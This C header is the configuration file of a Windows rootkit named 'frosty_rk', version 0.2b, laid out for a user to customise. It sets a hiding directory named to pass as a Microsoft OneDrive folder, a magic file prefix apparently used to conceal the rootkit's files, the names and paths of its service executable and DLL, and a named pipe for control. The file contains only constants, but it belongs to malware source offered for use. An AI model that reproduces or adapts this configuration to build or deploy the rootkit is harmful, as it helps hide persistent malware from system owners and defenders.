#ifndef _CONFIG_H
#define _CONFIG_H

#define RK_VERSION "0.2b"

//===================[YOU CAN CHANGE THIS]========================//
#define HIDE_PATH L"C:\\ProgramData\\Microsoft OneDrive"
#define MAGIC_PREFIX L"frosty_"
#define MAGIC_SUFFIX L"rk"											// MAGIC_PREFIX + MAGIC_SUFFIX = L"frosty_rk"

#define RK_SERVICE_SUFFIX L"Service.exe"
#define RK_DLL_SUFFIX L"Dll.dll"

#define RK_SERVICE_DESCRIPTION MAGIC_PREFIX MAGIC_SUFFIX
//===============================================================//

#define RK_SERVICE_NAME MAGIC_PREFIX MAGIC_SUFFIX
#define RK_SERVICE_PATH HIDE_PATH L"\\" MAGIC_PREFIX RK_SERVICE_SUFFIX
#define RK_DLL_PATH HIDE_PATH L"\\" MAGIC_PREFIX RK_DLL_SUFFIX

#define RK_SERVICE_FILENAME MAGIC_PREFIX RK_SERVICE_SUFFIX
#define RK_DLL_FILENAME MAGIC_PREFIX RK_DLL_SUFFIX

#define RK_PIPE L"\\\\.\\pipe\\" MAGIC_PREFIX MAGIC_SUFFIX
#define RK_UNINSTALL 0x0

#endif
